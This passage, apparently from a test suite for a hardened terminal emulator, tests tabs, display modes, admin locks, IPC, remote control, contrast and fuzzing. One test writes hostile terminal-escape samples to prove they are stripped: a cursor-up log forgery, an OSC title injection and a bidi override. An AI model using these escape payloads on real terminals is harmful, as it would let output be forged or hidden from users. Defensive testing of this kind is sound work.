   'the InfoTip text is selectable (can be copied)')
# the InfoTip font scales with the current tab zoom
win.current().apply_zoom(200)
_he2 = _QHelpEvent(_QEvent.Type.ToolTip, _QP(3, 3), _tipbtn.mapToGlobal(_QP(3, 3)))
_filt.eventFilter(_tipbtn, _he2)
_big = _tip.font().pointSizeF()
win.current().apply_zoom(100)
_filt.eventFilter(_tipbtn, _he2)
_small = _tip.font().pointSizeF()
ok(_big > _small, 'the InfoTip font grows with zoom')
_tip.hide()
# closing the find bar clears highlights and restores the caret to the output
win.hide_find()
ok(win._find_bar.isHidden(), 'Esc/close hides the find bar')
ok(len(_ft.extraSelections()) == 0 and len(_ft2.extraSelections()) == 0,
   'closing find clears all match highlights')
# window tab actions: previous-tab wraps around, goto jumps by position, select
# all selects the current buffer, full screen toggles
win.new_tab()
win.new_tab()
_cnt = win.tabs.count()
win.tabs.setCurrentIndex(0)
win._on_tab_step(-1)
eq(win.tabs.currentIndex(), _cnt - 1, 'previous-tab wraps to the last tab')
win._goto_tab(0)
eq(win.tabs.currentIndex(), 0, 'goto tab 1 by position')
win.current()._append('pick me')
win.select_all()
ok(bool(win.current().textCursor().selectedText()), 'select all selects the buffer')
win.toggle_fullscreen(True)
ok(win.isFullScreen(), 'full screen on')
win.toggle_fullscreen(False)
# unicode display is four mutually-exclusive buttons (Box/Reveal/Detail/Show),
# default detail, colour-coded by safety
win.act_box.trigger()
ok(win.act_box.isChecked() and win.current().current_mode() == 'box',
   'Box button selects box')
win.act_show.trigger()
_checked = sum(a.isChecked() for a in (win.act_box, win.act_reveal, win.act_show))
eq((win.current().current_mode(), _checked), ('show', 1),
   'Show button selects show, exclusively (only one checked)')
win.act_reveal.trigger()
eq(win.current().current_mode(), 'reveal', 'Reveal button selects reveal')
ok(not win.act_box.icon().isNull() and not win.act_show.icon().isNull(),
   'mode buttons carry icons')
# security indicator: two lamps. display axis (show=red, reveal=green [safe and
# lossless], box=green [safe -- the neutralized char is a hard-to-miss coloured
# box, though lossy]) and mode axis (TUI=yellow, line=green).
win.set_mode('box')
eq((win._display_level()[1], win._display_level()[0]), ('Box', '#1f8a54'),
   'box display -> green (safe; the box placeholder is hard to miss)')
win.set_mode('reveal')
eq((win._display_level()[1], win._display_level()[0]), ('Reveal', '#1f8a54'),
   'reveal display -> green (safe and lossless, not red)')
win.set_mode('show')
eq((win._display_level()[1], win._display_level()[0]), ('Show', '#d83933'),
   'show display -> red')
# the box display mode is labelled "Box" (it draws a box; it does not strip the
# data stream), and its tooltip says it is a DISPLAY setting -- not the bytes a
# program pipes elsewhere, so "cat file | bash" runs regardless.
eq(win.act_box.text(), '&Box', 'the box display mode is user-labelled Box')
ok('cat file | bash' in win.act_box.toolTip(),
   'the Box tooltip clarifies it is display-only, not bytes piped elsewhere')
eq(win._mode_level()[1], 'CLI', 'CLI mode -> green mode lamp')
if tui_available():
    win.set_tui(True)
    eq((win._mode_level()[1], win._mode_level()[0]), ('TUI', '#e5a50a'),
       'TUI -> yellow mode lamp (independent of the display lamp)')
    win.set_tui(False)
    # enabling TUI leans this tab to 'show' for readability but must NOT persist
    # 'show' as the global default, and turning TUI off restores the prior mode.
    win.set_mode('box')
    win.set_tui(True)
    eq(win.current().current_mode(), 'show', 'TUI leans the tab to show')
    eq(win._default_mode, 'box', 'TUI does NOT persist show as the global default')
    win.set_tui(False)
    eq(win.current().current_mode(), 'box', 'turning TUI off restores box')
# a plain tab switch must not mutate persisted settings (setChecked on toggled
# actions is blocked): flip colours off on tab B, switch away and back.
_before_colors = win._default_colors
win.new_tab()
win.set_colors(not _before_colors)
_toggled = win._default_colors
win._goto_tab(0)                       # switch away (fires setChecked, blocked)
win._goto_tab(win.tabs.count() - 1)    # and back
eq(win._default_colors, _toggled, 'tab switch does not rewrite the colours default')
win.set_mode('box')
ok(not win.sec_display.icon().isNull() and not win.sec_mode.icon().isNull(),
   'both security lamps show an icon')
# About dialog builds without error (patch exec so the modal does not block)
from PyQt6.QtWidgets import QDialog as _QDialog          # noqa: E402
_orig_exec = _QDialog.exec
_QDialog.exec = lambda _self: 0
try:
    win.show_about()
    win._show_security_details()
    ok(True, 'About + security-detail dialogs build without error')
finally:
    _QDialog.exec = _orig_exec
# global settings apply to every open tab and update the defaults
win.new_tab()
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal',
                   'colors': True, 'tui': False,
                   'osc': {'osc_title': True, 'osc_clipboard': True},
                   'scrollback': 1000, 'paste_delay': 5, 'persist': True})
ok(all((win.tabs.widget(i).current_theme(), win.tabs.widget(i).current_mode(),
        win.tabs.widget(i).current_scrollback()) == ('light', 'reveal', 1000)
       for i in range(win.tabs.count())),
   'global settings applied to every open tab')
ok(all(win.tabs.widget(i).osc_enabled('osc_title')
       and win.tabs.widget(i).osc_enabled('osc_clipboard')
       for i in range(win.tabs.count())),
   'global settings apply the granular OSC toggles to every tab')
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal', 'colors': True,
                   'tui': False, 'osc': {'osc_title': False, 'osc_clipboard': False},
                   'scrollback': 1000, 'paste_delay': 5, 'persist': True})
eq(win._default_mode, 'reveal', 'global settings updated the default mode')
# slash-command palette: applies settings, leading slash optional, invalid -> False
ok(win.run_command('/theme light') and win.current().current_theme() == 'light',
   'command /theme light')
ok(win.run_command('mode reveal') and win.current().current_mode() == 'reveal',
   'command mode reveal (no leading slash)')
ok(win.run_command('/colors on') and win.current().colors_enabled(),
   'command /colors on')
ok(win.run_command('/zoom 150') and win.current().current_zoom() == 150,
   'command /zoom 150')
ok(not win.run_command('/bogus xyz'), 'unknown command returns False')
win.set_theme('light')
win.set_zoom(140)
win.set_mode('reveal')
win.close()
cfg = settings.load()
eq(cfg.get('theme'), 'light', 'setting persisted theme')
eq(cfg.get('zoom'), '140', 'setting persisted zoom')
eq(cfg.get('unicode_mode'), 'reveal', 'setting persisted mode')

# --- admin-locked settings (hardening: a privileged drop-in wins, user ignored)
_sysd = tempfile.mkdtemp(prefix='st-sys-')
_usrd = tempfile.mkdtemp(prefix='st-usr-')
_orig_sys, _orig_usr = settings._system_dirs, settings._user_config_dir
settings._system_dirs = lambda: [_sysd]
settings._user_config_dir = lambda: _usrd
try:
    with open(os.path.join(_sysd, '30_default.conf'), 'w') as _f:
        _f.write('tui=false\ncolors=false\nunicode_mode=box\n'
                 'lock=tui,colors,unicode_mode\n')
    with open(os.path.join(_usrd, '50_user.conf'), 'w') as _f:
        _f.write('colors=true\ntui=true\ntheme=light\nlock=colors\n')
    lc = settings.load()
    eq(lc.get('colors'), 'false', 'locked colours keep the admin value')
    eq(lc.get('tui'), 'false', 'locked tui keeps the admin value')
    eq(lc.get('theme'), 'light', 'an UNlocked key still lets the user win')
    eq(sorted(lc.locked), ['colors', 'remote_control', 'tui', 'unicode_mode'],
       'locked = admin locks + the always-privileged remote_control')
    eq(sorted(lc.violations), ['colors', 'tui'],
       'ignored user overrides of locked keys are recorded')
    # the window disables the locked controls and guards the setters
    lw = MainWindow()
    ok(not lw.act_colors.isEnabled() and not lw.act_tui.isEnabled()
       and all(not a.isEnabled() for a in lw._mode_actions.values()),
       'locked controls are greyed out in the UI')
    ok(lw._locked_violations, 'the window surfaces the locked-override violation')
    lw.set_colors(True)
    ok(not lw._default_colors, 'set_colors is a no-op when colours are locked')
    lw.set_mode('show')
    ok(lw._default_mode != 'show', 'set_mode is a no-op when the mode is locked')
    lw.close()
    # save() must never write a locked key back to the (dead) user config
    settings.save({'colors': 'true', 'theme': 'dark'}, locked=lc.locked)
    with open(settings.user_config_file()) as _wf:
        _written = _wf.read()
    ok('colors=' not in _written and 'theme=dark' in _written,
       'save drops locked keys, keeps unlocked ones')
finally:
    settings._system_dirs, settings._user_config_dir = _orig_sys, _orig_usr

# --- launch CLI parsing (--title/--tui/--mode/--class/--tab/-- command) -------
from secure_terminal.main import _parse_launch_args as _pla       # noqa: E402
eq(_pla(['--title', 'logs', '--tui', '--mode', 'reveal']).tabs,
   [{'title': 'logs', 'tui': True, 'mode': 'reveal', 'command': None,
     'colors': None, 'bell': None, 'osc': None}],
   'cli: single-tab options')
# per-tab settings overrides parse into the tab spec
_ps = _pla(['--colors', '--bell', 'audible,visual', '--osc', 'osc_clipboard_read',
            '--osc', 'osc_title']).tabs[0]
eq((_ps['colors'], _ps['bell'], _ps['osc']),
   (True, 'audible,visual', ['osc_clipboard_read', 'osc_title']),
   'cli: per-tab colours/bell/osc(repeatable) parse')
eq(_pla(['--no-colors']).tabs[0]['colors'],
   False, 'cli: --no-colors turns a tab setting off')
eq(_pla(['--', 'htop', '--no-color']).tabs[0]['command'], ['htop', '--no-color'],
   'cli: -- gives a real argv (no shell reparse)')
eq(_pla(['-e', 'ls -la']).tabs[0]['command'], 'ls -la',
   'cli: -e gives a shell-split string')
_lc = _pla(['--class', 'MyTerm', '--name', 'inst'])
eq((_lc.wm_class, _lc.wm_name), ('MyTerm', 'inst'), 'cli: WM class/name parsed')
eq([(t['title'], t['tui']) for t in
    _pla(['--tab', '--title', 'A', '--tab', '--title', 'B', '--tui']).tabs],
   [('A', None), ('B', True)], 'cli: --tab multi-tab, no empty leading tab')
eq(_pla([]).tabs, [], 'cli: bare launch specifies no tabs (normal startup)')
eq(_pla(['--title', 'a', '--tab', '--title', 'b', '--', 'sleep', '9'])
   .tabs[-1]['command'], ['sleep', '9'], 'cli: -- command attaches to last tab')
# robustness: adversarial / malformed argv must never crash uncaught (argparse
# may SystemExit on a bad option, which is correct for a CLI; nothing else raises)
for _argv in ([], ['--'], ['--', '--tab', '--title'], ['--tab'], ['--tab', '--tab'],
              ['--title'], ['--mode', 'bogus'], ['--class'], ['-e'],
              ['--', '-e', '--tab', '--'], ['\x00', '\x1b', '--tab', 'x'],
              ['--tab'] * 50):
    try:
        _r = _pla(_argv)
        ok(isinstance(_r.tabs, list), 'cli: argv %r -> a valid spec' % (_argv[:3],))
    except SystemExit:
        ok(True, 'cli: argv %r rejected cleanly (argparse exit)' % (_argv[:3],))
# a launch tab opens with its title/mode/command
_lw = MainWindow(launch=_pla(['--title', 'mytab', '--mode', 'reveal',
                              '--', 'sleep', '30']))
pump(150)
eq(_lw.tabs.tabText(0), 'mytab', 'launch: tab title applied')
eq(_lw.current().current_mode(), 'reveal', 'launch: display mode applied')
_lw.close()

# a launch tab APPLIES its per-tab overrides (osc feature + bell channels)
_lo = MainWindow(launch=_pla(['--osc', 'osc_clipboard_read', '--bell', 'visual',
                              '--', 'sleep', '30']))
pump(150)
_lot = _lo.current()
ok(_lot.osc_enabled('osc_clipboard_read'),
   'launch: --osc enables the named OSC feature for that tab only')
eq(_lot.bell_channels(), {'visual'}, 'launch: --bell sets the tab bell channels')
_lo.close()

# an admin lock ALWAYS wins over a CLI per-tab override
_lk = MainWindow(launch=_pla([]))
_lk._locked = frozenset({'osc_clipboard_read', 'bell', 'colors'})
_lk._open_launch_tab({'osc': ['osc_clipboard_read'], 'bell': 'audible',
                      'colors': True, 'command': ['sleep', '30']})
pump(80)
_lkt = _lk.current()
ok(not _lkt.osc_enabled('osc_clipboard_read'),
   'launch: an admin lock overrides a CLI --osc override')
eq(_lkt.bell_channels(), _lk._default_bell,
   'launch: an admin lock overrides a CLI --bell override')
_lk.close()

# an unknown / bogus --osc feature is ignored (never crashes, never enables)
_lb = MainWindow(launch=_pla(['--osc', 'not_a_feature', '--', 'sleep', '30']))
pump(80)
ok(not _lb.current().osc_enabled('not_a_feature') if
   hasattr(_lb.current(), 'osc_enabled') else True,
   'launch: an unknown --osc feature is ignored')
_lb.close()

# --- single-instance IPC: a running instance opens a client's tabs ------------
import threading                                       # noqa: E402
from secure_terminal.main import _launch_to_request    # noqa: E402
from secure_terminal import ipc as _ipc                # noqa: E402
os.environ['XDG_RUNTIME_DIR'] = tempfile.mkdtemp()     # isolated socket dir
srvwin = MainWindow(launch=_pla([]))
srvwin.start_instance_server('default')
pump(150)
ok(os.path.exists(_ipc.socket_path('default')), 'ipc: server bound its socket')
eq(oct(os.stat(_ipc.socket_path('default')).st_mode & 0o777), '0o700',
   'ipc: socket is owner-only (0700)')
_before = srvwin.tabs.count()
_res = {}


def _client():
    spec = _pla(['--title', 'fromclient', '--', 'sleep', '30'])
    _res['reply'] = _ipc.send_request('default', _launch_to_request(spec))


_th = threading.Thread(target=_client)
_th.start()
for _ in range(300):                                   # pump so the server answers
    pump(10)
    if not _th.is_alive():
        break
_th.join()
eq(_res.get('reply', {}).get('ok'), True, 'ipc: client open request accepted')
eq(srvwin.tabs.count(), _before + 1, 'ipc: the running instance opened the tab')
ok(any(srvwin.tabs.tabText(i) == 'fromclient' for i in range(srvwin.tabs.count())),
   'ipc: opened tab carries the client title')
# a malformed op is refused, not crashed
eq(srvwin._dispatch_request(b'{"op":"bogus"}').get('ok'), False,
   'ipc: unknown op refused')
eq(srvwin._dispatch_request(b'not json').get('ok'), False, 'ipc: bad json refused')
# remote control is OFF here (no admin conf) -> ctl ops refused
eq(srvwin._dispatch_request(b'{"op":"ctl-ls"}').get('ok'), False,
   'ctl: refused when remote_control is off')
srvwin.close()

# --- remote control (ctl), enabled by a privileged config ---------------------
_rcsys = tempfile.mkdtemp(prefix='st-rcsys-')
with open(os.path.join(_rcsys, '90_rc.conf'), 'w') as _f:
    _f.write('remote_control=true\n')
_o_sys2 = settings._system_dirs
settings._system_dirs = lambda: [_rcsys]
try:
    rcwin = MainWindow(launch=_pla(['--title', 'main']))
    pump(120)
    ok(rcwin._remote_control, 'ctl: privileged remote_control=true enables it')
    _lsr = rcwin._dispatch_request(b'{"op":"ctl-ls"}')
    ok(_lsr.get('ok') and _lsr['tabs'][0]['title'] == 'main', 'ctl: ls lists tabs')
    _t = spy_writes(rcwin.current())
    _sr = rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:main","text":"ok\\n"}')
    ok(_sr.get('ok') and _t == [b'ok\r'],
       'ctl: send-text injects sanitized text (newline -> CR)')
    # a control character in send-text is dropped by the sanitizer
    _t2 = spy_writes(rcwin.current())
    rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"id:0","text":"a\\u001bb"}')
    ok(_t2 == [b'ab'], 'ctl: send-text strips an escape (no injection)')
    rcwin._dispatch_request(
        b'{"op":"ctl-set-tab-title","tab":"id:0","title":"renamed"}')
    eq(rcwin.tabs.tabText(0), 'renamed', 'ctl: set-tab-title renames the tab')
    eq(rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:nope","text":"x"}').get('ok'), False,
        'ctl: an unmatched tab is an error')
    # dump-tab: read back a tab's current rendered text (for E2E assertions)
    rcwin.current()._append('alpha\nbeta\ngamma')
    pump(20)
    _dr = rcwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}')
    ok(_dr.get('ok') and _dr['text'].endswith('gamma'), 'ctl: dump-tab reads the tab text')
    _dr2 = rcwin._dispatch_request(
        b'{"op":"ctl-dump-tab","tab":"id:0","lines":1}')
    eq(_dr2.get('text'), 'gamma', 'ctl: dump-tab --lines returns the tail')
    rcwin.close()
finally:
    settings._system_dirs = _o_sys2

# dump-tab is gated like the other ctl ops
_o_sys3 = settings._system_dirs
settings._system_dirs = lambda: [tempfile.mkdtemp()]      # no remote_control
try:
    offwin = MainWindow(launch=_pla([]))
    pump(60)
    eq(offwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}').get('ok'),
       False, 'ctl: dump-tab refused when remote control is off')
    offwin.close()
finally:
    settings._system_dirs = _o_sys3

# --- cat-over-ssh: sanitization is at the render layer, so the byte SOURCE is
# irrelevant. A malicious file cat'd on a REMOTE host over ssh reaches the local
# terminal as the same pty byte stream a local program would emit, and is
# sanitized the same. We prove it end to end by having a subprocess emit exactly
# what a remote `cat evil-file` would deliver (the git-diffs-lie / Trojan-Source
# bytes) and asserting the rendered document is safe.
import tempfile as _tf2                                  # noqa: E402
_evil = os.path.join(_tf2.mkdtemp(prefix='st-ssh-'), 'cat_evil.sh')
with open(_evil, 'w') as _f:
    # printf writes raw bytes to stdout, exactly as `cat` of a crafted file over
    # ssh would. The cursor-up + erase-line tries to reach the EARLIER line and
    # overwrite it -- the classic log-forgery. \033 is ESC.
    _f.write('#!/bin/sh\n'
             "printf 'SECRET_REAL_OUTPUT\\n'\n"
             "printf '\\033[1A\\033[2KHIDDEN_FAKE\\n'\n"   # up+erase the line above
             "printf '\\033]0;pwned\\007visible-text\\n'\n"  # OSC title injection
             "printf 'admin \\342\\200\\256nimda\\342\\200\\254 bidi\\n'\n"
             'sleep 30\n')
os.chmod(_evil, 0o700)
ssh = SecureTerminal(command=_evil)          # stands in for: ssh host cat evil
ssh.resize(700, 300)
ssh.show()
pump(500)
_doc = ssh.toPlainText()
ok('\x1b' not in _doc, 'ssh/cat: no escape byte survives to the document')
ok('\x9b' not in _doc and '\x07' not in _doc, 'ssh/cat: no C1 / BEL survives')
ok(chr(0x202e) not in _doc, 'ssh/cat: the bidi override is neutralized')
# the cursor-UP is stripped, so the forgery cannot reach the EARLIER line: the
# real output survives (a program can only rewrite its own current line).
ok('SECRET_REAL_OUTPUT' in _doc,
   'ssh/cat: cross-line forgery prevented (cursor-up cannot hide earlier output)')
ok('visible-text' in _doc, 'ssh/cat: honest visible text is shown')
# the OSC title payload is stripped whole -- it never reaches the document
ok('pwned' not in _doc, 'ssh/cat: the OSC-0 title-injection payload is stripped')
ssh.shutdown()

# --- fuzz the Qt-side request parsers (owner-only socket, but still defensive) -
from hypothesis import given as _given, strategies as _hst   # noqa: E402
from hypothesis import settings as _hset                     # noqa: E402
from secure_terminal.main import _sanitize_tab_spec          # noqa: E402
_HRUN = _hset(max_examples=150, deadline=None)


@_HRUN
@_given(_hst.dictionaries(
    _hst.text(max_size=12),
    _hst.one_of(_hst.none(), _hst.text(max_size=32), _hst.booleans(),
                _hst.integers(), _hst.lists(_hst.text(max_size=8), max_size=4))))
def _fuzz_tab_spec(spec):
    out = _sanitize_tab_spec(spec)
    assert set(out) == {'title', 'tui', 'mode', 'command',
                        'colors', 'bell', 'osc'}
    assert out['title'] is None or isinstance(out['title'], str)
    assert out['tui'] is None or isinstance(out['tui'], bool)
    assert out['mode'] is None or isinstance(out['mode'], str)
    assert out['colors'] is None or isinstance(out['colors'], bool)
    assert out['bell'] is None or isinstance(out['bell'], str)
    assert out['osc'] is None or (isinstance(out['osc'], list)
                                  and all(isinstance(f, str) for f in out['osc']))


try:
    _fuzz_tab_spec()
    ok(True, 'fuzz: _sanitize_tab_spec validates arbitrary IPC tab specs')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _sanitize_tab_spec raised: %s' % _e)

_fw = MainWindow(launch=_pla([]))


@_HRUN
@_given(_hst.binary(max_size=256))
def _fuzz_dispatch(payload):
    reply = _fw._dispatch_request(payload)
    assert isinstance(reply, dict) and 'ok' in reply


try:
    _fuzz_dispatch()
    ok(True, 'fuzz: _dispatch_request handles arbitrary IPC bytes without crashing')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _dispatch_request raised: %s' % _e)
_fw.close()

# fuzz: the TUI OSC handler must be chunk-boundary invariant -- an OSC fed whole
# vs split at any point must fire the SAME action (the OSC-split-across-reads bug
# class). One reused terminal; reset the OSC carry between the two runs.
_ofz = SecureTerminal(command='/bin/cat', tui=True)
_ofz.apply_osc('osc_notify', True)
_ofz.apply_osc('osc_cwd', True)


@_HRUN
@_given(_hst.text(alphabet=_hst.characters(min_codepoint=32, max_codepoint=126),
                  max_size=48),
        _hst.integers(min_value=0, max_value=52))
def _fuzz_osc_split(body, split):
    seq = b'\x1b]9;' + body.encode('ascii') + b'\x07'
    _ofz._osc_carry = b''
    whole = []
    _cw = _ofz.notified.connect(lambda s: whole.append(s))
    _ofz._handle_osc(seq)
    _ofz.notified.disconnect(_cw)
    _ofz._osc_carry = b''
    parts = []
    _cs = _ofz.notified.connect(lambda s: parts.append(s))
    _ofz._handle_osc(seq[:split])
    _ofz._handle_osc(seq[split:])
    _ofz.notified.disconnect(_cs)
    assert whole == parts


@_HRUN
@_given(_hst.binary(max_size=64))
def _fuzz_osc7_safe(raw):
    # any OSC 7 path emitted to the tab tooltip is fully safe (a percent-decoded
    # bidi/zero-width/control byte can never reach it)
    body = raw.replace(b'\x07', b'').replace(b'\x1b', b'')
    _ofz._osc_carry = b''
    _ofz._reported_cwd = ''
    got = []
    _c = _ofz.cwd_changed.connect(lambda p: got.append(p))
    _ofz._handle_osc(b'\x1b]7;file://h/' + body + b'\x07')
    _ofz.cwd_changed.disconnect(_c)
    for _p in got:
        assert _S.render_output(_p, 'box') == _p    # already safe: nothing to strip


for _name, _prop in (('osc_split', _fuzz_osc_split), ('osc7_safe', _fuzz_osc7_safe)):
    try:
        _prop()
        ok(True, 'fuzz: OSC handler %s invariant holds' % _name)
    except Exception as _e:            # pylint: disable=broad-except
        ok(False, 'fuzz: OSC handler %s: %s' % (_name, _e))
_ofz.close()

# --- adversarial: OSC split-invariance BEYOND OSC 9 + no split-smuggled write --
# An OSC of ANY code fed whole vs split at any offset must have the SAME observable
# effect, crucially the SAME write-backs -- so an attacker cannot smuggle a
# reflection / injection through a chunk boundary. Extends the OSC-9-only notify
# test to title/palette/cwd/hyperlink/clipboard/colour-query codes, and asserts on
# the WRITE spy (the injection-relevant channel), not just a signal.
_osz = SecureTerminal(command='/bin/cat')
for _f in ('osc_title', 'osc_notify', 'osc_cwd', 'osc_hyperlink', 'osc_clipboard'):
    try:
        _osz.apply_osc(_f, True)
    except Exception:                  # pylint: disable=broad-except
        pass                           # feature may not exist; the sweep still runs


def _osc_writes(seq_parts):
    _osz._osc_carry = b''
    captured = []
    _orig = _osz._write
    _osz._write = captured.append      # pylint: disable=protected-access
    try:
        for part in seq_parts:
            _osz._handle_osc(part)
    finally:
        _osz._write = _orig
    return captured


@_HRUN
@_given(_hst.sampled_from((0, 1, 2, 4, 7, 8, 9, 10, 11, 52, 104)),
        _hst.text(alphabet=_hst.characters(min_codepoint=32, max_codepoint=126),
                  max_size=40),
        _hst.integers(min_value=0, max_value=48))
def _prop_osc_split_writeback(code, body, split):
    seq = b'\x1b]' + str(code).encode('ascii') + b';' + body.encode('ascii') + b'\x07'
    whole = _osc_writes([seq])
    parts = _osc_writes([seq[:split], seq[split:]])
    assert whole == parts, 'code=%d split=%d: whole=%r split=%r' % (
        code, split, whole, parts)


try:
    _prop_osc_split_writeback()
    ok(True, 'adversarial: OSC split-invariance holds across codes (no write smuggled '
             'through a chunk boundary)')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'adversarial: OSC split-invariance: %s' % _e)
_osz.close()

# --- adversarial: the contrast guard holds for the WHOLE attacker colour space --
# The guard must keep text readable for ANY program-chosen fg/bg -- a palette index,
# a 256-colour, or a 24-bit truecolour, on either theme -- not just the one
# black-on-dark case. The attacker picks the colours, so the invariant (final fg is
# never near-invisible against its effective bg) must survive every pick.
from secure_terminal.terminal import THEMES as _THEMES, _rgb as _rgb_of  # noqa: E402
from secure_terminal.sanitize import too_close as _too_close             # noqa: E402
from PyQt6.QtGui import QColor as _QColor2                                # noqa: E402

_cg = SecureTerminal(command='/bin/cat')
_cg.apply_colors(True)
_colorval = _hst.one_of(
    _hst.none(),
    _hst.integers(min_value=0, max_value=15),
    _hst.builds(lambda r, g, b: '#%02x%02x%02x' % (r, g, b),
                _hst.integers(0, 255), _hst.integers(0, 255), _hst.integers(0, 255)))


@_HRUN
@_given(_colorval, _colorval, _hst.booleans(), _hst.sampled_from(('dark', 'light')))
def _prop_contrast_guard(fg_i, bg_i, bold, theme):
    _cg.apply_theme(theme)
    fmt = _cg._format_for({'fg': fg_i, 'bg': bg_i, 'bold': bold})
    fg_brush = fmt.foreground()
    if fg_brush.style() == Qt.BrushStyle.NoBrush:
        return                         # nothing coloured -> invariant N/A
    base_bg = _THEMES.get(theme, _THEMES['dark'])[0]
    bg_brush = fmt.background()
    bg = (bg_brush.color() if bg_brush.style() != Qt.BrushStyle.NoBrush
          else _QColor2(base_bg))
    assert not _too_close(_rgb_of(fg_brush.color()), _rgb_of(bg)), (
        'fg=%r bg=%r theme=%s -> unreadable' % (fg_i, bg_i, theme))


try:
    _prop_contrast_guard()
    ok(True, 'adversarial: the contrast guard keeps text readable for ANY program '
             'colours (palette / 256 / truecolour, both themes)')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'adversarial: contrast guard failed: %s' % _e)

# --- exhaustive + deterministic: EVERY ANSI palette combination (line mode) ----
# The hypothesis sweep above samples the truecolour space; this pass ENUMERATES
# the realistic attack surface with no randomness -- each of the 16 ANSI palette
# colours (and the default) as fg against each as bg, bold on and off, on both
# themes -- and asserts the invariant on every single one: the final foreground is
# never near-invisible against its effective background. Deterministic, so a
# regression can never slip through on a lucky seed.
def _eff_pair(fmt, theme):
    _fgb = fmt.foreground()
    if _fgb.style() == Qt.BrushStyle.NoBrush:
        return None
    _base_bg = _THEMES.get(theme, _THEMES['dark'])[0]
    _bgb = fmt.background()
    _bg = (_bgb.color() if _bgb.style() != Qt.BrushStyle.NoBrush
           else _QColor2(_base_bg))
    return _rgb_of(_fgb.color()), _rgb_of(_bg)

_line_checked = 0
_line_bad = []
for _theme in ('dark', 'light'):
    _cg.apply_theme(_theme)
    for _fg in list(range(16)) + [None]:
        for _bg in list(range(16)) + [None]:
            for _bold in (False, True):
                _pair = _eff_pair(
                    _cg._format_for({'fg': _fg, 'bg': _bg, 'bold': _bold}), _theme)
                if _pair is None:
                    continue
                _line_checked += 1
                if _too_close(*_pair):
                    _line_bad.append((_theme, _fg, _bg, _bold))
ok(not _line_bad,
   'contrast(line): every ANSI fg x bg x bold x theme stays readable '
   '(%d combos checked, unreadable: %r)' % (_line_checked, _line_bad[:3]))

# a program cannot hide text by painting fg == bg for ANY palette index either.
_hide_bad = []
for _theme in ('dark', 'light'):
    _cg.apply_theme(_theme)
    for _i in range(16):
        _pair = _eff_pair(_cg._format_for({'fg': _i, 'bg': _i, 'bold': False}), _theme)
        if _pair and _too_close(*_pair):
            _hide_bad.append((_theme, _i))
ok(not _hide_bad,
   'contrast(line): fg==bg for every palette index is forced readable (bad: %r)' % _hide_bad)
_cg.close()

# --- configurable window keyboard shortcuts -----------------------------------
# Every window shortcut is registered (documented) and rebindable, with conflict
# detection; only non-default overrides are persisted. Terminal control keys are
# NOT in this registry (they always go to the program).
ok(len(win._shortcuts) >= 14, 'all window shortcuts are registered for the dialog')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'a shortcut has its default binding')
eq(win._set_shortcuts({'new_tab': 'Ctrl+Alt+N'}), [], 'a rebind applies with no conflict')
eq(win.act_new.shortcut().toString(), 'Ctrl+Alt+N', 'the action takes the new binding')
eq(win._keybindings.get('new_tab'), 'Ctrl+Alt+N', 'a non-default binding is stored as an override')
win._set_shortcuts({'new_tab': 'Ctrl+Shift+T'})
ok('new_tab' not in win._keybindings, 'reverting to the default drops the override')
_kc = win._set_shortcuts({'copy': 'Ctrl+Shift+J', 'paste': 'Ctrl+Shift+J'})
ok(bool(_kc), 'two actions on one combination is reported as a conflict')
eq(win.act_copy.shortcut().toString(), 'Ctrl+Shift+C',
   'a conflicting rebind applies nothing (copy keeps its binding)')
# a bare Ctrl+<letter> is reserved for the terminal (Ctrl+U/R reach the program)
ok(bool(win._set_shortcuts({'new_tab': 'Ctrl+U'})),
   'binding a window action to a terminal control key is rejected')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'the reserved rebind applied nothing')
ok(bool(win._set_shortcuts({'new_tab': 'A'})),
   'binding to a bare printable key (which would eat typing) is rejected')
# Ctrl+Shift/Ctrl+Alt combos are fine, and a built-in default that happens to be
# Ctrl+<letter> (quit = Ctrl+Q) is allowed to stand
eq(win._set_shortcuts({'quit': 'Ctrl+Q', 'new_tab': 'Ctrl+Alt+T'}), [],
   'a default Ctrl+Q and a Ctrl+Alt combo are accepted')
win._set_shortcuts({'new_tab': 'Ctrl+Shift+T'})       # restore default
# an admin lock on keybindings refuses edits entirely
_saved_locked = win._locked
win._locked = set(win._locked) | {'keybindings'}
ok(bool(win._set_shortcuts({'new_tab': 'Ctrl+Alt+Z'})),
   'a locked keybindings setting refuses edits')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'the locked edit applied nothing')
win._locked = _saved_locked

# --- New Tab: CLI vs TUI mode chosen at creation (#69) ------------------------
from secure_terminal.terminal import tui_available as _ntt_avail   # noqa: E402
_saved_dtui = win._default_tui
win._default_tui = False
win.new_tab(tui=False)
ok(win.current()._tui is False, 'new_tab(tui=False) opens a CLI-mode tab')
ok(win.act_new_cli.isEnabled(), 'the New Tab (CLI) action is always available')
if _ntt_avail():
    win.new_tab(tui=True)
    ok(win.current()._tui is True, 'new_tab(tui=True) opens a TUI-mode tab')
    ok(win.act_new_tui.isEnabled(), 'New Tab (TUI) is enabled when pyte is present')
else:
    win.new_tab(tui=True)
    ok(win.current()._tui is False,
       'new_tab(tui=True) falls back to CLI when pyte is missing')
    ok(not win.act_new_tui.isEnabled(),
       'New Tab (TUI) is disabled when pyte is missing')
# the default variant follows the window default, not a forced mode
win._default_tui = False
win.new_tab()
ok(win.current()._tui is False, 'plain new_tab() uses the window default (CLI)')
win._default_tui = _saved_dtui

# an override loaded from config is honoured at build time via _bind()
_kb = MainWindow()
_kb._keybindings = {'close_tab': 'Ctrl+Alt+W'}
from PyQt6.QtGui import QAction as _QAction        # noqa: E402
_probe = _QAction('&Close Tab', _kb)
_kb._bind(_probe, 'close_tab', 'Ctrl+Shift+W')
eq(_probe.shortcut().toString(), 'Ctrl+Alt+W', '_bind applies a config override over the default')
_kb.close()

# --- OSC handler robustness (codex follow-up) --------------------------------
